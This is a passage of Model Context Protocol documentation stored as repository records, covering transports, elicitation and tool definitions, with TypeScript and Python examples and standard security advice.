{"source":"github","repo":"mcp-spec","path":"docs/legacy/concepts/transports.mdx","content":"---\ntitle: \"Transports\"\ndescription: \"Learn about MCP's communication mechanisms\"\n---\n\nTransports in the Model Context Protocol (MCP) provide the foundation for communication between clients and servers. A transport handles the underlying mechanics of how messages are sent and received.\n\n## Message Format\n\nMCP uses [JSON-RPC](https://www.jsonrpc.org/) 2.0 as its wire format. The transport layer is responsible for converting MCP protocol messages into JSON-RPC format for transmission and converting received JSON-RPC messages back into MCP protocol messages.\n\nThere are three types of JSON-RPC messages used:\n\n### Requests\n\n```typescript\n{\n  jsonrpc: \"2.0\",\n  id: number | string,\n  method: string,\n  params?: object\n}\n```\n\n### Responses\n\n```typescript\n{\n  jsonrpc: \"2.0\",\n  id: number | string,\n  result?: object,\n  error?: {\n    code: number,\n    message: string,\n    data?: unknown\n  }\n}\n```\n\n### Notifications\n\n```typescript\n{\n  jsonrpc: \"2.0\",\n  method: string,\n  params?: object\n}\n```\n\n## Built-in Transport Types\n\nMCP currently defines two standard transport mechanisms:\n\n### Standard Input/Output (stdio)\n\nThe stdio transport enables communication through standard input and output streams. This is particularly useful for local integrations and command-line tools.\n\nUse stdio when:\n\n- Building command-line tools\n- Implementing local integrations\n- Needing simple process communication\n- Working with shell scripts\n\n#### Server\n\n<CodeGroup>\n\n```typescript TypeScript\nconst server = new Server(\n  {\n    name: \"example-server\",\n    version: \"1.0.0\",\n  },\n  {\n    capabilities: {},\n  },\n);\n\nconst transport = new StdioServerTransport();\nawait server.connect(transport);\n```\n\n```python Python\napp = Server(\"example-server\")\n\nasync with stdio_server() as streams:\n    await app.run(\n        streams[0],\n        streams[1],\n        app.create_initialization_options()\n    )\n```\n\n</CodeGroup>\n\n#### Client\n\n<CodeGroup>\n\n```typescript TypeScript\nconst client = new Client(\n  {\n    name: \"example-client\",\n    version: \"1.0.0\",\n  },\n  {\n    capabilities: {},\n  },\n);\n\nconst transport = new StdioClientTransport({\n  command: \"./server\",\n  args: [\"--option\", \"value\"],\n});\nawait client.connect(transport);\n```\n\n```python Python\nparams = StdioServerParameters(\n    command=\"./server\",\n    args=[\"--option\", \"value\"]\n)\n\nasync with stdio_client(params) as streams:\n    async with ClientSession(streams[0], streams[1]) as session:\n        await session.initialize()\n```\n\n</CodeGroup>\n\n### Streamable HTTP\n\nThe Streamable HTTP transport uses HTTP POST requests for client-to-server communication and optional Server-Sent Events (SSE) streams for server-to-client communication.\n\nUse Streamable HTTP when:\n\n- Building web-based integrations\n- Needing client-server communication over HTTP\n- Requiring stateful sessions\n- Supporting multiple concurrent clients\n- Implementing resumable connections\n\n#### How it Works\n\n1. **Client-to-Server Communication**: Every JSON-RPC message from client to server is sent as a new HTTP POST request to the MCP endpoint\n2. **Server Responses**: The server can respond either with:\n   - A single JSON response (`Content-Type: application/json`)\n   - An SSE stream (`Content-Type: text/event-stream`) for multiple messages\n3. **Server-to-Client Communication**: Servers can send requests/notifications to clients via:\n   - SSE streams initiated by client requests\n   - SSE streams from HTTP GET requests to the MCP endpoint\n\n#### Server\n\n<CodeGroup>\n\n```typescript TypeScript\nimport express from \"express\";\n\nconst app = express();\n\nconst server = new Server(\n  {\n    name: \"example-server\",\n    version: \"1.0.0\",\n  },\n  {\n    capabilities: {},\n  },\n);\n\n// MCP endpoint handles both POST and GET\napp.post(\"/mcp\", async (req, res) => {\n  // Handle JSON-RPC request\n  const response = await server.handleRequest(req.body);\n\n  // Return single response or SSE stream\n  if (needsStreaming) {\n    res.setHeader(\"Content-Type\", \"text/event-stream\");\n    // Send SSE events...\n  } else {\n    res.json(response);\n  }\n});\n\napp.get(\"/mcp\", (req, res) => {\n  // Optional: Support server-initiated SSE streams\n  res.setHeader(\"Content-Type\", \"text/event-stream\");\n  // Send server notifications/requests...\n});\n\napp.listen(3000);\n```\n\n```python Python\nfrom mcp.server.http import HttpServerTransport\nfrom starlette.applications import Starlette\nfrom starlette.routing import Route\n\napp = Server(\"example-server\")\n\nasync def handle_mcp(scope, receive, send):\n    if scope[\"method\"] == \"POST\":\n        # Handle JSON-RPC request\n        response = await app.handle_request(request_body)\n\n        if needs_streaming:\n            # Return SSE stream\n            await send_sse_response(send, response)\n        else:\n            # Return JSON response\n            await send_json_response(send, response)\n\n    elif scope[\"method\"] == \"GET\":\n        # Optional: Support server-initiated SSE streams\n        await send_sse_stream(send)\n\nstarlette_app = Starlette(\n    routes=[\n        Route(\"/mcp\", endpoint=handle_mcp, methods=[\"POST\", \"GET\"]),\n    ]\n)\n```\n\n</CodeGroup>\n\n#### Client\n\n<CodeGroup>\n\n```typescript TypeScript\nconst client = new Client(\n  {\n    name: \"example-client\",\n    version: \"1.0.0\",\n  },\n  {\n    capabilities: {},\n  },\n);\n\nconst transport = new HttpClientTransport(new URL(\"http://localhost:3000/mcp\"));\nawait client.connect(transport);\n```\n\n```python Python\nasync with http_client(\"http://localhost:8000/mcp\") as transport:\n    async with ClientSession(transport[0], transport[1]) as session:\n        await session.initialize()\n```\n\n</CodeGroup>\n\n#### Session Management\n\nStreamable HTTP supports stateful sessions to maintain context across multiple requests:\n\n1. **Session Initialization**: Servers may assign a session ID during initialization by including it in an `Mcp-Session-Id` header\n2. **Session Persistence**: Clients must include the session ID in all subsequent requests using the `Mcp-Session-Id` header\n3. **Session Termination**: Sessions can be explicitly terminated by sending an HTTP DELETE request with the session ID\n\nExample session flow:\n\n```typescript\n// Server assigns session ID during initialization\napp.post(\"/mcp\", (req, res) => {\n  if (req.body.method === \"initialize\") {\n    const sessionId = generateSecureId();\n    res.setHeader(\"Mcp-Session-Id\", sessionId);\n    // Store session state...\n  }\n  // Handle request...\n});\n\n// Client includes session ID in subsequent requests\nfetch(\"/mcp\", {\n  method: \"POST\",\n  headers: {\n    \"Content-Type\": \"application/json\",\n    \"Mcp-Session-Id\": sessionId,\n  },\n  body: JSON.stringify(request),\n});\n```\n\n#### Resumability and Redelivery\n\nTo support resuming broken connections, Streamable HTTP provides:\n\n1. **Event IDs**: Servers can attach unique IDs to SSE events for tracking\n2. **Resume from Last Event**: Clients can resume by sending the `Last-Event-ID` header\n3. **Message Replay**: Servers can replay missed messages from the disconnection point\n\nThis ensures reliable message delivery even with unstable network connections.\n\n#### Security Considerations\n\nWhen implementing Streamable HTTP transport, follow these security best practices:\n\n1. **Validate Origin Headers**: Always validate the `Origin` header on all incoming connections to prevent DNS rebinding attacks\n2. **Bind to Localhost**: When running locally, bind only to localhost (127.0.0.1) rather than all network interfaces (0.0.0.0)\n3. **Implement Authentication**: Use proper authentication for all connections\n4. **Use HTTPS**: Always use TLS/HTTPS for production deployments\n5. **Validate Session IDs**: Ensure session IDs are cryptographically secure and properly validated\n\nWithout these protections, attackers could use DNS rebinding to interact with local MCP servers from remote websites.\n\n### Server-Sent Events (SSE) - Deprecated\n\n<Note>\n  SSE as a standalone transport is deprecated as of protocol version 2024-11-05.\n  It has been replaced by Streamable HTTP, which incorporates SSE as an optional\n  streaming mechanism. For backwards compatibility information, see the\n  [backwards compatibility](#backwards-compatibility) section below.\n</Note>\n\nThe legacy SSE transport enabled server-to-client streaming with HTTP POST requests for client-to-server communication.\n\nPreviously used when:\n\n- Only server-to-client streaming is needed\n- Working with restricted networks\n- Implementing simple updates\n\n#### Legacy Security Considerations\n\nThe deprecated SSE transport had similar security considerations to Streamable HTTP, particularly regarding DNS rebinding attacks. These same protections should be applied when using SSE streams within the Streamable HTTP transport.\n\n#### Server\n\n<CodeGroup>\n\n```typescript TypeScript\nimport express from \"express\";\n\nconst app = express();\n\nconst server = new Server(\n  {\n    name: \"example-server\",\n    version: \"1.0.0\",\n  },\n  {\n    capabilities: {},\n  },\n);\n\nlet transport: SSEServerTransport | null = null;\n\napp.get(\"/sse\", (req, res) => {\n  transport = new SSEServerTransport(\"/messages\", res);\n  server.connect(transport);\n});\n\napp.post(\"/messages\", (req, res) => {\n  if (transport) {\n    transport.handlePostMessage(req, res);\n  }\n});\n\napp.listen(3000);\n```\n\n```python Python\nfrom mcp.server.sse import SseServerTransport\nfrom starlette.applications import Starlette\nfrom starlette.routing import Route\n\napp = Server(\"example-server\")\nsse = SseServerTransport(\"/messages\")\n\nasync def handle_sse(scope, receive, send):\n    async with sse.connect_sse(scope, receive, send) as streams:\n        await app.run(streams[0], streams[1], app.create_initialization_options())\n\nasync def handle_messages(scope, receive, send):\n    await sse.handle_post_message(scope, receive, send)\n\nstarlette_app = Starlette(\n    routes=[\n        Route(\"/sse\", endpoint=handle_sse),\n        Route(\"/messages\", endpoint=handle_messages, methods=[\"POST\"]),\n    ]\n)\n```\n\n</CodeGroup>\n\n#### Client\n\n<CodeGroup>\n\n```typescript TypeScript\nconst client = new Client(\n  {\n    name: \"example-client\",\n    version: \"1.0.0\",\n  },\n  {\n    capabilities: {},\n  },\n);\n\nconst transport = new SSEClientTransport(new URL(\"http://localhost:3000/sse\"));\nawait client.connect(transport);\n```\n\n```python Python\nasync with sse_client(\"http://localhost:8000/sse\") as streams:\n    async with ClientSession(streams[0], streams[1]) as session:\n        await session.initialize()\n```\n\n</CodeGroup>\n\n## Custom Transports\n\nMCP makes it easy to implement custom transports for specific needs. Any transport implementation just needs to conform to the Transport interface:\n\nYou can implement custom transports for:\n\n- Custom network protocols\n- Specialized communication channels\n- Integration with existing systems\n- Performance optimization\n\n<CodeGroup>\n\n```typescript TypeScript\ninterface Transport {\n  // Start processing messages\n  start(): Promise<void>;\n\n  // Send a JSON-RPC message\n  send(message: JSONRPCMessage): Promise<void>;\n\n  // Close the connection\n  close(): Promise<void>;\n\n  // Callbacks\n  onclose?: () => void;\n  onerror?: (error: Error) => void;\n  onmessage?: (message: JSONRPCMessage) => void;\n}\n```\n\n```python Python\n# Note that while MCP Servers are often implemented with asyncio, we recommend\n# implementing low-level interfaces like transports with `anyio` for wider compatibility.\n\n@contextmanager\nasync def create_transport(\n    read_stream: MemoryObjectReceiveStream[JSONRPCMessage | Exception],\n    write_stream: MemoryObjectSendStream[JSONRPCMessage]\n):\n    \"\"\"\n    Transport interface for MCP.\n\n    Args:\n        read_stream: Stream to read incoming messages from\n        write_stream: Stream to write outgoing messages to\n    \"\"\"\n    async with anyio.create_task_group() as tg:\n        try:\n            # Start processing messages\n            tg.start_soon(lambda: process_messages(read_stream))\n\n            # Send messages\n            async with write_stream:\n                yield write_stream\n\n        except Exception as exc:\n            # Handle errors\n            raise exc\n        finally:\n            # Clean up\n            tg.cancel_scope.cancel()\n            await write_stream.aclose()\n            await read_stream.aclose()\n```\n\n</CodeGroup>\n\n## Error Handling\n\nTransport implementations should handle various error scenarios:\n\n1. Connection errors\n2. Message parsing errors\n3. Protocol errors\n4. Network timeouts\n5. Resource cleanup\n\nExample error handling:\n\n<CodeGroup>\n\n```typescript TypeScript\nclass ExampleTransport implements Transport {\n  async start() {\n    try {\n      // Connection logic\n    } catch (error) {\n      this.onerror?.(new Error(`Failed to connect: ${error}`));\n      throw error;\n    }\n  }\n\n  async send(message: JSONRPCMessage) {\n    try {\n      // Sending logic\n    } catch (error) {\n      this.onerror?.(new Error(`Failed to send message: ${error}`));\n      throw error;\n    }\n  }\n}\n```\n\n```python Python\n# Note that while MCP Servers are often implemented with asyncio, we recommend\n# implementing low-level interfaces like transports with `anyio` for wider compatibility.\n\n@contextmanager\nasync def example_transport(scope: Scope, receive: Receive, send: Send):\n    try:\n        # Create streams for bidirectional communication\n        read_stream_writer, read_stream = anyio.create_memory_object_stream(0)\n        write_stream, write_stream_reader = anyio.create_memory_object_stream(0)\n\n        async def message_handler():\n            try:\n                async with read_stream_writer:\n                    # Message handling logic\n                    pass\n            except Exception as exc:\n                logger.error(f\"Failed to handle message: {exc}\")\n                raise exc\n\n        async with anyio.create_task_group() as tg:\n            tg.start_soon(message_handler)\n            try:\n                # Yield streams for communication\n                yield read_stream, write_stream\n            except Exception as exc:\n                logger.error(f\"Transport error: {exc}\")\n                raise exc\n            finally:\n                tg.cancel_scope.cancel()\n                await write_stream.aclose()\n                await read_stream.aclose()\n    except Exception as exc:\n        logger.error(f\"Failed to initialize transport: {exc}\")\n        raise exc\n```\n\n</CodeGroup>\n\n## Best Practices\n\nWhen implementing or using MCP transport:\n\n1. Handle connection lifecycle properly\n2. Implement proper error handling\n3. Clean up resources on connection close\n4. Use appropriate timeouts\n5. Validate messages before sending\n6. Log transport events for debugging\n7. Implement reconnection logic when appropriate\n8. Handle backpressure in message queues\n9. Monitor connection health\n10. Implement proper security measures\n\n## Security Considerations\n\nWhen implementing transport:\n\n### Authentication and Authorization\n\n- Implement proper authentication mechanisms\n- Validate client credentials\n- Use secure token handling\n- Implement authorization checks\n\n### Data Security\n\n- Use TLS for network transport\n- Encrypt sensitive data\n- Validate message integrity\n- Implement message size limits\n- Sanitize input data\n\n### Network Security\n\n- Implement rate limiting\n- Use appropriate timeouts\n- Handle denial of service scenarios\n- Monitor for unusual patterns\n- Implement proper firewall rules\n- For HTTP-based transports (including Streamable HTTP), validate Origin headers to prevent DNS rebinding attacks\n- For local servers, bind only to localhost (127.0.0.1) instead of all interfaces (0.0.0.0)\n\n## Debugging Transport\n\nTips for debugging transport issues:\n\n1. Enable debug logging\n2. Monitor message flow\n3. Check connection states\n4. Validate message formats\n5. Test error scenarios\n6. Use network analysis tools\n7. Implement health checks\n8. Monitor resource usage\n9. Test edge cases\n10. Use proper error tracking\n\n## Backwards Compatibility\n\nTo maintain compatibility between different protocol versions:\n\n### For Servers Supporting Older Clients\n\nServers wanting to support clients using the deprecated HTTP+SSE transport should:\n\n1. Host both the old SSE and POST endpoints alongside the new MCP endpoint\n2. Handle initialization requests on both endpoints\n3. Maintain separate handling logic for each transport type\n\n### For Clients Supporting Older Servers\n\nClients wanting to support servers using the deprecated transport should:\n\n1. Accept server URLs that may use either transport\n2. Attempt to POST an `InitializeRequest` with proper `Accept` headers:\n   - If successful, use Streamable HTTP transport\n   - If it fails with 4xx status, fall back to legacy SSE transport\n3. Issue a GET request expecting an SSE stream with `endpoint` event for legacy servers\n\nExample compatibility detection:\n\n```typescript\nasync function detectTransport(serverUrl: string): Promise<TransportType> {\n  try {\n    // Try Streamable HTTP first\n    const response = await fetch(serverUrl, {\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n        Accept: \"application/json, text/event-stream\",\n      },\n      body: JSON.stringify({\n        jsonrpc: \"2.0\",\n        method: \"initialize\",\n        params: {\n          /* ... */\n        },\n      }),\n    });\n\n    if (response.ok) {\n      return \"streamable-http\";\n    }\n  } catch (error) {\n    // Fall back to legacy SSE\n    const sseResponse = await fetch(serverUrl, {\n      method: \"GET\",\n      headers: { Accept: \"text/event-stream\" },\n    });\n\n    if (sseResponse.ok) {\n      return \"legacy-sse\";\n    }\n  }\n\n  throw new Error(\"Unsupported transport\");\n}\n```\n"}
{"source":"github","repo":"mcp-spec","path":"docs/legacy/concepts/elicitation.mdx","content":"---\ntitle: \"Elicitation\"\ndescription: \"Interactive information gathering in MCP\"\n---\n\nElicitation is a powerful MCP feature that allows servers to request additional information from users during interactions. This enables dynamic workflows where servers can gather necessary data on-demand while maintaining user control and privacy.\n\n<Info>\n  Elicitation is newly introduced in the MCP specification [revision\n  2025-06-18](/specification/2025-06-18/client/elicitation).\n</Info>\n\n## What is Elicitation?\n\nElicitation provides a standardized way for MCP servers to request structured information from users through the client. Instead of requiring all information upfront, servers can ask for specific data exactly when needed, creating more natural and flexible interactions.\n\nFor example, a server might:\n\n- Request a username when connecting to a service\n- Ask for configuration preferences during setup\n- Gather project details when creating new resources\n\n## How Elicitation Works\n\nThe elicitation flow is straightforward:\n\n1. Server sends an elicitation request with a message and expected data structure\n2. Client presents the request to the user with appropriate UI\n3. User accepts, declines, or cancels the request\n4. Client validates and returns the response to the server\n5. Server continues processing with the provided information\n\n## Request Structure\n\nElicitation requests include two key components:\n\n### Message\n\nA clear, human-readable explanation of what information is needed and why.\n\n### Schema\n\nA JSON Schema that defines the expected structure of the response. The schema is intentionally limited to flat objects with primitive types to simplify client implementation.\n\nExample request:\n\n```json\n{\n  \"message\": \"Please provide your GitHub username\",\n  \"requestedSchema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"username\": {\n        \"type\": \"string\",\n        \"title\": \"GitHub Username\",\n        \"description\": \"Your GitHub username (e.g., octocat)\"\n      }\n    },\n    \"required\": [\"username\"]\n  }\n}\n```\n\n## Supported Data Types\n\nElicitation supports these primitive types:\n\n### Text Input\n\n```json\n{\n  \"type\": \"string\",\n  \"title\": \"Project Name\",\n  \"description\": \"Name for your new project\",\n  \"minLength\": 3,\n  \"maxLength\": 50,\n  \"default\": \"my-project\"\n}\n```\n\n### Numbers\n\n```json\n{\n  \"type\": \"number\",\n  \"title\": \"Port Number\",\n  \"description\": \"Port to run the server on\",\n  \"minimum\": 1024,\n  \"maximum\": 65535,\n  \"default\": 3000\n}\n```\n\n### Boolean Choices\n\n```json\n{\n  \"type\": \"boolean\",\n  \"title\": \"Enable Analytics\",\n  \"description\": \"Send anonymous usage statistics\",\n  \"default\": false\n}\n```\n\n### Selection Lists\n\n```json\n{\n  \"type\": \"string\",\n  \"title\": \"Environment\",\n  \"enum\": [\"development\", \"staging\", \"production\"],\n  \"enumNames\": [\"Development\", \"Staging\", \"Production\"],\n  \"default\": \"development\"\n}\n```\n\n## User Response Actions\n\nUsers can respond to elicitation requests in three ways:\n\n1. **Accept**: User provides the requested information\n2. **Decline**: User explicitly refuses to provide information\n3. **Cancel**: User dismisses without making a choice (e.g., closes dialog)\n\nServers should handle each response appropriately:\n\n- Accept → Process the provided data\n- Decline → Offer alternatives or adjust workflow\n- Cancel → Consider retrying later or using defaults\n\n## Best Practices\n\nWhen implementing elicitation:\n\n### For Servers\n\n1. **Be Clear**: Write descriptive messages explaining why information is needed\n2. **Be Minimal**: Only request essential information\n3. **Be Flexible**: Have fallbacks for declined or cancelled requests\n4. **Be Timely**: Request information when actually needed, not preemptively\n5. **Be Respectful**: Never request sensitive information like passwords or tokens\n\n### For Clients\n\n1. **Be Transparent**: Clearly show which server is requesting information\n2. **Be Protective**: Allow users to review and modify responses\n3. **Be Validating**: Check responses against the provided schema\n4. **Be Empowering**: Make decline and cancel options prominent\n5. **Be Limiting**: Implement rate limiting to prevent spam\n\n## Common Use Cases\n\nElicitation excels in scenarios like:\n\n- **Initial Setup**: Gathering configuration during first-time setup\n- **Dynamic Workflows**: Requesting context-specific information\n- **User Preferences**: Collecting optional settings and preferences\n- **Project Details**: Gathering metadata about resources being created\n- **Service Integration**: Requesting usernames or IDs for external services\n\n## Example Workflow\n\nHere's a typical elicitation interaction:\n\n```mermaid\nsequenceDiagram\n    participant User\n    participant Client\n    participant Server\n\n    Note over Server,Client: Server initiates elicitation\n    Server->>Client: elicitation/create\n\n    Note over Client,User: Human interaction\n    Client->>User: Present elicitation UI\n    User-->>Client: Provide requested information\n\n    Note over Server,Client: Complete request\n    Client-->>Server: Return user response\n\n    Note over Server: Continue processing with new information\n```\n\n## Security Considerations\n\n<Warning>\n  Servers must never use elicitation to request passwords, API keys, tokens, or\n  other sensitive credentials. Use proper authentication flows instead.\n</Warning>\n\nKey security guidelines:\n\n1. Servers should only request non-sensitive information\n2. Clients should clearly indicate which server is requesting data\n3. Users should always have the option to decline\n4. Responses should be validated against the schema\n5. Rate limiting should prevent request flooding\n\n## Implementation Example\n\nHere's how a server might use elicitation to gather project information:\n\n```typescript\n// Server requests project details\nconst response = await client.request(\"elicitation/create\", {\n  message: \"Let's set up your new project\",\n  requestedSchema: {\n    type: \"object\",\n    properties: {\n      name: {\n        type: \"string\",\n        title: \"Project Name\",\n        description: \"A descriptive name for your project\",\n      },\n      framework: {\n        type: \"string\",\n        title: \"Framework\",\n        enum: [\"react\", \"vue\", \"angular\", \"none\"],\n        enumNames: [\"React\", \"Vue\", \"Angular\", \"None\"],\n      },\n      useTypeScript: {\n        type: \"boolean\",\n        title: \"Use TypeScript\",\n        default: true,\n      },\n      port: {\n        type: \"number\",\n        title: \"Development Port\",\n        description: \"Port number for the dev server\",\n        default: 3000,\n      },\n    },\n    required: [\"name\", \"framework\"],\n  },\n});\n\n// Handle the response\nif (response.action === \"accept\") {\n  // Create project with provided details\n  await createProject(response.content);\n} else if (response.action === \"decline\") {\n  // Use defaults or offer alternatives\n  await createDefaultProject();\n} else {\n  // User cancelled - perhaps retry later\n  console.log(\"Project creation cancelled\");\n}\n```\n\nThis approach creates a smooth, interactive experience while respecting user control and privacy.\n"}

Through tools, LLMs can interact with external systems, perform computations, and take actions in the real world.\n\n<Note>\n\nTools are designed to be **model-controlled**, meaning that tools are exposed from servers to clients with the intention of the AI model being able to automatically invoke them (with a human in the loop to grant approval).\n\n</Note>\n\n## Overview\n\nTools in MCP allow servers to expose executable functions that can be invoked by clients and used by LLMs to perform actions. Key aspects of tools include:\n\n- **Discovery**: Clients can obtain a list of available tools by sending a `tools/list` request\n- **Invocation**: Tools are called using the `tools/call` request, where servers perform the requested operation and return results\n- **Flexibility**: Tools can range from simple calculations to complex API interactions\n\nLike [resources](/legacy/concepts/resources), tools are identified by unique names and can include descriptions to guide their usage. However, unlike resources, tools represent dynamic operations that can modify state or interact with external systems.\n\n## Tool definition structure\n\nEach tool is defined with the following structure:\n\n```typescript\n{\n  name: string;          // Unique identifier for the tool\n  title?: string;        // Optional human-readable name of the tool for display purposes\n  description?: string;  // Human-readable description\n  inputSchema: {         // JSON Schema for the tool's parameters\n    type: \"object\",\n    properties: { ... }  // Tool-specific parameters\n  },\n  annotations?: {        // Optional hints about tool behavior\n    title?: string;      // Human-readable title for the tool\n    readOnlyHint?: boolean;    // If true, the tool does not modify its environment\n    destructiveHint?: boolean; // If true, the tool may perform destructive updates\n    idempotentHint?: boolean;  // If true, repeated calls with same args have no additional effect\n    openWorldHint?: boolean;   // If true, tool interacts with external entities\n  }\n}\n```\n\n## Implementing tools\n\nHere's an example of implementing a basic tool in an MCP server:\n\n<CodeGroup>\n\n```typescript TypeScript\nconst server = new Server(\n  {\n    name: \"example-server\",\n    version: \"1.0.0\",\n  },\n  {\n    capabilities: {\n      tools: {},\n    },\n  },\n);\n\n// Define available tools\nserver.setRequestHandler(ListToolsRequestSchema, async () => {\n  return {\n    tools: [\n      {\n        name: \"calculate_sum\",\n        title: \"Calculate Sum\",\n        description: \"Add two numbers together\",\n        inputSchema: {\n          type: \"object\",\n          properties: {\n            a: { type: \"number\" },\n            b: { type: \"number\" },\n          },\n          required: [\"a\", \"b\"],\n        },\n      },\n    ],\n  };\n});\n\n// Handle tool execution\nserver.setRequestHandler(CallToolRequestSchema, async (request) => {\n  if (request.params.name === \"calculate_sum\") {\n    const { a, b } = request.params.arguments;\n    return {\n      content: [\n        {\n          type: \"text\",\n          text: String(a + b),\n        },\n      ],\n    };\n  }\n  throw new Error(\"Tool not found\");\n});\n```\n\n```python Python\napp = Server(\"example-server\")\n\n@app.list_tools()\nasync def list_tools() -> list[types.Tool]:\n    return [\n        types.Tool(\n            name=\"calculate_sum\",\n            title=\"Calculate Sum\",\n            description=\"Add two numbers together\",\n            inputSchema={\n                \"type\": \"object\",\n                \"properties\": {\n                    \"a\": {\"type\": \"number\"},\n                    \"b\": {\"type\": \"number\"}\n                },\n                \"required\": [\"a\", \"b\"]\n            }\n        )\n    ]\n\n@app.call_tool()\nasync def call_tool(\n    name: str,\n    arguments: dict\n) -> list[types.TextContent | types.ImageContent | types.EmbeddedResource]:\n    if name == \"calculate_sum\":\n        a = arguments[\"a\"]\n        b = arguments[\"b\"]\n        result = a + b\n        return [types.TextContent(type=\"text\", text=str(result))]\n    raise ValueError(f\"Tool not found: {name}\")\n```\n\n</CodeGroup>\n\n## Example tool patterns\n\nHere are some examples of types of tools that a server could provide:\n\n### System operations\n\nTools that interact with the local system:\n\n```typescript\n{\n  name: \"execute_command\",\n  title: \"Execute Command\",\n  description: \"Run a shell command\",\n  inputSchema: {\n    type: \"object\",\n    properties: {\n      command: { type: \"string\" },\n      args: { type: \"array\", items: { type: \"string\" } }\n    }\n  }\n}\n```\n\n### API integrations\n\nTools that wrap external APIs:\n\n```typescript\n{\n  name: \"github_create_issue\",\n  title: \"Create GitHub Issue\",\n  description: \"Create a GitHub issue\",\n  inputSchema: {\n    type: \"object\",\n    properties: {\n      title: { type: \"string\" },\n      body: { type: \"string\" },\n      labels: { type: \"array\", items: { type: \"string\" } }\n    }\n  }\n}\n```\n\n### Data processing\n\nTools that transform or analyze data:\n\n```typescript\n{\n  name: \"analyze_csv\",\n  title: \"Analyze CSV\",\n  description: \"Analyze a CSV file\",\n  inputSchema: {\n    type: \"object\",\n    properties: {\n      filepath: { type: \"string\" },\n      operations: {\n        type: \"array\",\n        items: {\n          enum: [\"sum\", \"average\", \"count\"]\n        }\n      }\n    }\n  }\n}\n```\n\n## Best practices\n\nWhen implementing tools:\n\n1. Provide clear, descriptive names and descriptions\n2. Use detailed JSON Schema definitions for parameters\n3. Include examples in tool descriptions to demonstrate how the model should use them\n4. Implement proper error handling and validation\n5. Use progress reporting for long operations\n6. Keep tool operations focused and atomic\n7. Document expected return value structures\n8. Implement proper timeouts\n9. Consider rate limiting for resource-intensive operations\n10. Log tool usage for debugging and monitoring\n\n### Tool name conflicts\n\nMCP client applications and MCP server proxies may encounter tool name conflicts when building their own tool lists. For example, two connected MCP servers `web1` and `web2` may both expose a tool named `search_web`.\n\nApplications may disambiguiate tools with one of the following strategies (among others; not an exhaustive list):\n\n- Concatenating a unique, user-defined server name with the tool name, e.g. `web1___search_web` and `web2___search_web`. This strategy may be preferable when unique server names are already provided by the user in a configuration file.\n- Generating a random prefix for the tool name, e.g. `jrwxs___search_web` and `6cq52___search_web`. This strategy may be preferable in server proxies where user-defined unique names are not available.\n- Using the server URI as a prefix for the tool name, e.g. `web1.example.com:search_web` and `web2.example.com:search_web`. This strategy may be suitable when working with remote MCP servers.\n\nNote that the server-provided name from the initialization flow is not guaranteed to be unique and is not generally suitable for disambiguation purposes.\n\n## Security considerations\n\nWhen exposing tools:\n\n### Input validation\n\n- Validate all parameters against the schema\n- Sanitize file paths and system commands\n- Validate URLs and external identifiers\n- Check parameter sizes and ranges\n- Prevent command injection\n\n### Access control\n\n- Implement authentication where needed\n- Use appropriate authorization checks\n- Audit tool usage\n- Rate limit requests\n- Monitor for abuse\n\n### Error handling\n\n- Don't expose internal errors to clients\n- Log security-relevant errors\n- Handle timeouts appropriately\n- Clean up resources after errors\n- Validate return values\n\n## Tool discovery and updates\n\nMCP supports dynamic tool discovery:\n\n1. Clients can list available tools at any time\n2. Servers can notify clients when tools change using `notifications/tools/list_changed`\n3. Tools can be added or removed during runtime\n4. Tool definitions can be updated (though this should be done carefully)\n\n## Error handling\n\nTool errors should be reported within the result object, not as MCP protocol-level errors. This allows the LLM to see and potentially handle the error. When a tool encounters an error:\n\n1. Set `isError` to `true` in the result\n2. Include error details in the `content` array\n\nHere's an example of proper error handling for tools:\n\n<CodeGroup>\n\n```typescript TypeScript\ntry {\n  // Tool operation\n  const result = performOperation();\n  return {\n    content: [\n      {\n        type: \"text\",\n        text: `Operation successful: ${result}`,\n      },\n    ],\n  };\n} catch (error) {\n  return {\n    isError: true,\n    content: [\n      {\n        type: \"text\",\n        text: `Error: ${error.message}`,\n      },\n    ],\n  };\n}\n```\n\n```python Python\ntry:\n    # Tool operation\n    result = perform_operation()\n    return types.CallToolResult(\n        content=[\n            types.TextContent(\n                type=\"text\",\n                text=f\"Operation successful: {result}\"\n            )\n        ]\n    )\nexcept Exception as error:\n    return types.CallToolResult(\n        isError=True,\n        content=[\n            types.TextContent(\n                type=\"text\",\n                text=f\"Error: {str(error)}\"\n            )\n        ]\n    )\n```\n\n</CodeGroup>\n\nThis approach allows the LLM to see that an error occurred and potentially take corrective action or request human intervention.\n\n## Tool annotations\n\nTool annotations provide additional metadata about a tool's behavior, helping clients understand how to present and manage tools. These annotations are hints that describe the nature and impact of a tool, but should not be relied upon for security decisions.\n\n### Purpose of tool annotations\n\nTool annotations serve several key purposes:\n\n1. Provide UX-specific information without affecting model context\n2. Help clients categorize and present tools appropriately\n3. Convey information about a tool's potential side effects\n4. Assist in developing intuitive interfaces for tool approval\n\n### Available tool annotations\n\nThe MCP specification defines the following annotations for tools:\n\n| Annotation        | Type    | Default | Description                                                                                                                          |\n| ----------------- | ------- | ------- | ------------------------------------------------------------------------------------------------------------------------------------ |\n| `title`           | string  | -       | A human-readable title for the tool, useful for UI display                                                                           |\n| `readOnlyHint`    | boolean | false   | If true, indicates the tool does not modify its environment                                                                          |\n| `destructiveHint` | boolean | true    | If true, the tool may perform destructive updates (only meaningful when `readOnlyHint` is false)                                     |\n| `idempotentHint`  | boolean | false   | If true, calling the tool repeatedly with the same arguments has no additional effect (only meaningful when `readOnlyHint` is false) |\n| `openWorldHint`   | boolean | true    | If true, the tool may interact with an \"open world\" of external entities                                                             |\n\n### Example usage\n\nHere's how to define tools with annotations for different scenarios:\n\n```typescript\n// A read-only search tool\n{\n  name: \"web_search\",\n  title: \"Web Search\",\n  description: \"Search the web for information\",\n  inputSchema: {\n    type: \"object\",\n    properties: {\n      query: { type: \"string\" }\n    },\n    required: [\"query\"]\n  },\n  annotations: {\n    title: \"Web Search\",\n    readOnlyHint: true,\n    openWorldHint: true\n  }\n}\n\n// A destructive file deletion tool\n{\n  name: \"delete_file\",\n  title: \"Delete File\",\n  description: \"Delete a file from the filesystem\",\n  inputSchema: {\n    type: \"object\",\n    properties: {\n      path: { type: \"string\" }\n    },\n    required: [\"path\"]\n  },\n  annotations: {\n    title: \"Delete File\",\n    readOnlyHint: false,\n    destructiveHint: true,\n    idempotentHint: true,\n    openWorldHint: false\n  }\n}\n\n// A non-destructive database record creation tool\n{\n  name: \"create_record\",\n  title: \"Create Database Record\",\n  